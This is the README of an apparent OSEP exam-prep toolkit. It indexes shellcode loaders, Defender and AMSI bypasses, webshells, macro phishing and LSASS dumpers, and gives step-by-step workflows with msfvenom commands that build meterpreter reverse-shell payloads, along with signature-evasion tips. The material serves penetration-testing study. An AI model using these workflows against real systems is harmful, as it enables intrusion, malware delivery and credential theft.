# OSEP Toolkit - Template-Based Exam Preparation

A comprehensive, meticulously organized collection of source code templates, scripts, and tools for the Offensive Security Experienced Penetration Tester (OSEP) certification exam.

## 🎯 Philosophy: Templates Only

This toolkit follows a **template-only approach**:
- ✅ Source code templates you can customize
- ✅ Utilities and standalone tools
- ✅ Complete documentation and study notes
- ❌ NO pre-compiled payloads with hardcoded shellcode
- ❌ NO binaries you can't inspect or modify

**Why?** You need to see what your code does, control where it connects, and customize for each engagement.

## 🚀 Quick Start

- **Need a loader template?** → `/loaders/`
- **Want to encode shellcode?** → `/payloads/encoders/`
- **Looking for documentation?** → `/docs/COMPREHENSIVE_STRUCTURE_GUIDE.md`
- **Need utilities?** → `/utilities/`
- **Study notes?** → `/docs/study-notes/`

## 📁 Directory Structure

```
OSEP/
├── loaders/                # Code execution mechanisms (SOURCE CODE TEMPLATES)
│   ├── advanced-runners/   # Advanced shellcode runners with encoding
│   ├── applocker-bypass/   # AppLocker evasion techniques
│   ├── assembly-loader/    # .NET assembly loading + AMSI bypass
│   ├── clm-bypass/         # Constrained Language Mode bypass
│   ├── d-invoke/           # D_invoke framework (automated generation)
│   ├── defender-bypass/    # Windows Defender evasion
│   ├── disk-based/         # Disk-based loaders
│   ├── ipv4-runner/        # IPv4-obfuscated payloads
│   ├── linux/              # Linux shellcode loaders (C)
│   ├── memory-based/       # PowerShell in-memory loaders
│   ├── phishing/           # Phishing delivery mechanisms (HTA, HTML, JS)
│   ├── ppid-spoof-dropper/ # PPID spoofing process hollowing
│   ├── process-hollowing/  # Process hollowing templates
│   ├── process-injector/   # Process injection templates
│   ├── sections-injector/  # Section-based injection
│   ├── simple-runner/      # Basic shellcode runners
│   ├── vba-macro/          # VBA macro runners
│   └── webshells/          # ASPX webshells for IIS
│
├── payloads/               # Shellcode generation & encoding
│   ├── donut/              # PE to shellcode converter
│   ├── encoders/           # XOR, ROT, AES encoders (Python & C#)
│   └── raw/                # Raw shellcode generation
│
├── credentials/            # Credential harvesting tools
│   ├── MiniDump.cs         # LSASS dumper (C#)
│   ├── MiniDump.ps1        # LSASS dumper (PowerShell)
│   ├── linikatz            # Linux credential harvester
│   └── mimikatz-download.txt # Download link
│
├── privesc/                # Privilege escalation
│   ├── windows/            # Windows privesc (Potato, PrintSpoofer, Seatbelt, etc.)
│   │   ├── PrintSpoofer.cs # PrintSpoofer source code
│   │   ├── UACBypass.ps1   # UAC bypass
│   │   └── shakeitoff-src/ # AlwaysInstallElevated exploit (C++)
│   └── linux/              # Linux privesc (linpeas, pspy)
│
├── lateral-movement/       # Lateral movement techniques
│   ├── fileless/           # Fileless lateral movement
│   ├── mssql/              # MSSQL exploitation
│   ├── windows/            # Windows lateral movement (Rubeus, SharpHound)
│   └── *.sys               # Driver files for exploitation
│
├── utilities/              # Supporting tools
│   ├── automation/         # Automation scripts
│   ├── av-enumeration/     # AV/EDR detection and bypass
│   ├── shellcode-formatters/ # Shellcode formatting tools
│   ├── netcat/             # Network utilities
│   └── registry/           # Registry manipulation
│
└── docs/                   # Documentation & Study Notes
    ├── study-notes/        # Complete OSEP GitBook notes
    ├── COMPREHENSIVE_STRUCTURE_GUIDE.md  # Detailed guide
    ├── TEMPLATES_AND_WORKFLOWS.md        # Workflow documentation
    ├── FINAL_ORGANIZATION_COMPLETE.md    # Organization report
    ├── TOOL_INDEX.md       # Searchable tool index
    ├── images/             # Reference images
    └── [8 README files from source repos]
```

## 🚀 Common Workflows

### Workflow 1: Basic C# Shellcode Runner
1. **Generate shellcode**: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp`
2. **Choose template**: `/loaders/simple-runner/` or `/loaders/advanced-runners/`
3. **Insert shellcode**: Replace placeholder in .cs file
4. **Compile**: `csc /target:exe /out:runner.exe runner.cs`
5. **Deploy**: Transfer and execute

### Workflow 2: IPv4-Obfuscated Payload
1. **Generate raw shellcode**: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o payload.bin`
2. **Obfuscate**: `python3 /loaders/ipv4-runner/ipv4-obfuscate.py payload.bin`
3. **Use output**: Copy IPv4 array into C# loader template
4. **Compile and deploy**

### Workflow 3: Process Injection
1. **Generate shellcode**: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp`
2. **Choose template**: `/loaders/process-injector/inj_runner.cs`
3. **Optional encoding**: Use `/loaders/process-injector/inj_xor.cs` for XOR encoding
4. **Compile**: `csc /target:exe /out:injector.exe inj_runner.cs`
5. **Execute**: `injector.exe <target_process_name>`

### Workflow 4: VBA Macro with XOR Encoding
1. **Generate shellcode**: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f vbapplication`
2. **Encode**: Use XOR encoder from `/payloads/encoders/`
3. **Embed in macro**: `/loaders/vba-macro/WordMacroRunner.vbs`
4. **Create document**: Embed macro in Word document
5. **Deliver**: Phishing or social engineering

### Workflow 5: ASPX Webshell
1. **Generate shellcode**: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp`
2. **Choose template**: `/loaders/webshells/ASPX_Runner64.aspx` or `ASPX_Inject64.aspx`
3. **Insert shellcode**: Replace placeholder
4. **Upload**: To IIS server
5. **Trigger**: Browse to .aspx file

### Privilege Escalation Workflow
1. **Enumerate**: Use Seatbelt.exe or winPEAS.exe from `/privesc/windows/`
2. **Identify vector**: AlwaysInstallElevated, PrintSpoofer, Potato variants
3. **Compile exploit**: Use source from `/privesc/windows/`
4. **Execute**: Run compiled exploit
5. **Dump credentials**: Use MiniDump.cs or MiniDump.ps1 from `/credentials/`

### Lateral Movement Workflow
1. **AD enumeration**: `/lateral-movement/windows/SharpHound.ps1`
2. **Analyze**: Import into BloodHound
3. **MSSQL**: Use `/lateral-movement/mssql/PowerUpSQL.ps1` if SQL servers found
4. **Kerberos**: Use `/lateral-movement/windows/Rubeus.dll` for ticket attacks

## 📚 Key Documentation

- **[FINAL_ORGANIZATION_COMPLETE.md](docs/FINAL_ORGANIZATION_COMPLETE.md)** - Complete organization report
- **[COMPREHENSIVE_STRUCTURE_GUIDE.md](docs/COMPREHENSIVE_STRUCTURE_GUIDE.md)** - Detailed toolkit explanation
- **[TEMPLATES_AND_WORKFLOWS.md](docs/TEMPLATES_AND_WORKFLOWS.md)** - Step-by-step workflows
- **[TOOL_INDEX.md](docs/TOOL_INDEX.md)** - Searchable tool index
- **[study-notes/](docs/study-notes/)** - Complete OSEP course notes (GitBook)

## 🔑 Critical Concepts

### Template-Based Approach
- **Templates**: Source code you customize with YOUR shellcode and YOUR C2 server
- **Visibility**: You can see exactly what the code does
- **Control**: You decide where payloads connect
- **Safety**: No risk of connecting to unknown/compromised servers
- **Flexibility**: Customize for each engagement

### Loader Types
- **Simple Runners**: Basic shellcode execution (`/loaders/simple-runner/`)
- **Advanced Runners**: With encoding and evasion (`/loaders/advanced-runners/`)
- **Process Injection**: Inject into existing process (`/loaders/process-injector/`)
- **Process Hollowing**: Hollow and replace process (`/loaders/process-hollowing/`)
- **Memory-Based**: PowerShell in-memory execution (`/loaders/memory-based/`)
- **Web-Based**: ASPX webshells for IIS (`/loaders/webshells/`)

### Encoding & Obfuscation
- **XOR Encoding**: Simple XOR with key (`/payloads/encoders/`)
- **ROT Encoding**: Rotation cipher
- **AES Encryption**: Strong encryption with osepacker.py
- **IPv4 Obfuscation**: Shellcode as IPv4 addresses (`/loaders/ipv4-runner/`)
- **D_invoke**: Automated API hashing and obfuscation (`/loaders/d-invoke/`)

## ⚠️ Important Notes

### Compilation
- **C# to EXE**: `csc /target:exe /out:output.exe source.cs`
- **C# to DLL**: `csc /target:library /out:output.dll source.cs`
- **C to EXE**: `gcc -o output source.c`
- **Linux**: `gcc -fPIC -shared -o output.so source.c -ldl`

### Common Issues
1. **HTTPS Payloads**: May not work reliably. Use TCP variants.
2. **Msfvenom Encoders**: Don't use with hollowing tools - causes issues.
3. **Integrity Levels**: Injection target must be same or lower integrity than your process.
4. **PPID Spoofing**: Parent process must be same or lower integrity.
5. **D_invoke Builder**: Must run from D_invoke directory for dependencies.

### AMSI Bypass
- **PowerShell (Win10)**: See `/docs/OSEP-Tools-v2-README.md`
- **PowerShell (Win10+Win11)**: Obfuscated bypass in documentation
- **VBA**: Embedded in macro templates

### Defender Signatures
- Avoid `AutoOpen()` with API calls in VBA
- Use `RtlFillMemory` instead of `RtlMoveMemory`
- Obfuscate Amsi.dll resolution
- Test with latest Defender before deployment

## 🎓 Exam Tips

1. **Start with simple templates** - Don't overcomplicate
2. **Test in lab first** - Verify all tools work before exam
3. **Have backup methods** - Multiple loaders, multiple encoders
4. **Document everything** - Keep notes of what works
5. **Use cheatsheets** - Quick reference from `/docs/`
6. **Customize per target** - Don't reuse same payload
7. **Check integrity levels** - Before injection/hollowing
8. **Monitor AV behavior** - Adjust techniques as needed

## 📦 What's Included

### Source Code Templates (200+)
- 45+ C# templates (.cs)
- 35+ PowerShell scripts (.ps1)
- 15+ Python scripts (.py)
- 8+ C templates (.c)
- 8+ VBA/VBS macros (.vbs)
- 6+ ASPX webshells (.aspx)
- 4+ HTA files (.hta)

### Standalone Tools
- Privilege escalation binaries (Potato variants, PrintSpoofer, Seatbelt, winPEAS)
- Lateral movement tools (Rubeus, SharpHound, PowerUpSQL)
- Credential tools (linikatz, download links for mimikatz)
- Driver files for exploitation (.sys)

### Documentation (50+ files)
- Complete OSEP course notes (GitBook)
- Tool usage documentation
- Workflow guides
- Reference images
- Source repository READMEs

## 📖 Credits & Sources

This toolkit consolidates and organizes materials from 5 repositories:

1. **OSEP-Tools-v2** (hackinaggie) - Primary source for loaders and bypasses
2. **OSEP-Code-Snippets** (chvancooten) - Reference documentation
3. **OSEP-OffSec-Experienced-Pentester** - Complete GitBook study notes
4. **MyOSEPToolBox** - CLM bypass and shellcode packer
5. **OSEP** - Various payloads and lateral movement tools

Special thanks to:
- Octoberfest7 (OSEP-Tools original)
- chvancooten (OSEP-Code-Snippets)
- All OSEP course contributors

## 🔄 Organization History

- **Phase 1**: Initial organization of 4 repositories
- **Phase 2**: Comprehensive documentation creation
- **Phase 3**: Template-only conversion (removed 50+ compiled binaries)
- **Phase 4**: Final organization of remaining materials
- **Status**: ✅ COMPLETE (March 1, 2026)

See [FINAL_ORGANIZATION_COMPLETE.md](docs/FINAL_ORGANIZATION_COMPLETE.md) for detailed organization report.

## ⚖️ Disclaimer

This toolkit is for authorized penetration testing and educational purposes only. Use responsibly and legally.

---

**For detailed explanations of every tool and workflow, read:**
- [FINAL_ORGANIZATION_COMPLETE.md](docs/FINAL_ORGANIZATION_COMPLETE.md) - Organization report
- [COMPREHENSIVE_STRUCTURE_GUIDE.md](docs/COMPREHENSIVE_STRUCTURE_GUIDE.md) - Complete guide
- [TEMPLATES_AND_WORKFLOWS.md](docs/TEMPLATES_AND_WORKFLOWS.md) - Step-by-step workflows
